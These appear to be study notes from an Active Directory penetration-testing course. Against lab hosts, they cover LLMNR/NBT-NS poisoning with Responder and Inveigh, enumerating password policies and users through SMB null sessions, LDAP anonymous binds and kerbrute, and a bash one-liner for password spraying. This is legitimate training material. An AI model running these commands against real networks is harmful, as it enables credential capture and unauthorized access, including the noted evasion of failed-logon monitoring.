## Introduction
At the time of writing this module, Microsoft Active Directory holds around `43%` of the [market share](https://www.slintel.com/tech/identity-and-access-management/microsoft-active-directory-market-share#faqs) for enterprise organizations utilizing `Identity and Access management` solutions.
We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames

Our tasks to accomplish for this section are:
- Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
- This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
- Document any findings we come across for later use. Extremely important!

Kerbrute is good.

## LLMR/NBT-NS Poisoning from Linux
Man-In-The-Middle on Link-Local Multicaster Name Resolution (*LLMR/NBT*).
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification

1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

With *NTLM* has we can take it and pass it into hashcat or use it in pth attacks. 
Responder and Metasploit can both do LLMR/NBT-NS Poisoning

Useful `Reponder` Flags
`-w wpad server (capture http requests using internet explorer)`
`-A analyze mode`
`-f fingerprint`

*Responder provides NLTMv2 hashes which can be cracked with hashcat -m 5600*

## NLTMNR/NBT-NS Poisoning - from Windows
We use the term Inveigh to capture credentials.
Works similiar to Responder but uses C# and Powershell

#### Using Inveigh (Powershell)
```powershell-session
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```
```powershell-session
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

#### C# (Inveigh Zero)
```powershell-session
.\Inveigh.exe
```

We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.

## Password Spraying
[statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
### Enumerating The Password Policy - From Linux
```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### Enumerating Password Policy - SMB Null sesssion
Without password policy we may need to enumerate via a *SMB null session* or *LDAP anonymous bind*.

When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily.

We can use *rpcclient* to check domain controller for SMB NULL session access

```shell-session
rpcclient -U "" -N 172.16.5.5
querydominfo
```

Enum4linux is built around the samba suite of tools 

### Enumerating Null Session from Windows
It is less common to do this type of null session attack from Windows, but we could use the command `net use \\host\ipc$ "" /u:""` to establish a null session from a windows machine

### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind 
[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests.

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools.
With ldapsearch 

```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enumerating Password Policy - from Windows
#### Using net.exe
```cmd-session
net accounts
```

#### Using PowerView
```powershell-session
Get-DomainPolicy
```

## Password Spraying - Making a Target User List
* By using an *SMB NULL* session we can retrieve a full list of users.
* Utilizing an anonymous LDAP bind query to pull user domain list
* Using kerbrute with tilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
* Using set of credentials obtained from another means 

### SMB NULL Session to Pull User List
Enum4Linux can leverage null sessions to pull user lists.
```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
Or we can use `enumdomusers` after connecting anonymously with *rpcclient*.

If you have credentials for a System account you can trivially enumerate users as it can impersonate other users 

```shell-session
rpcclient -U "" -N 172.16.5.5
enumdomusers
```
#### Using CrackMapExec --users Flag
```shell-session
crackmapexec smb 172.16.5.5 --users
```

### Enumerating Users with an LDAP Anonymous session
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

### Enumerating Users with Kerbrute
If we have no access to a null session or ldap we can enumerate sessions with *Kerbrute*
This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for.

The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack

```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.
#### Validating 
```shell-session
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## Internal Password Spraying From Linux
#### Using a Bash one-liner for the Attack
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
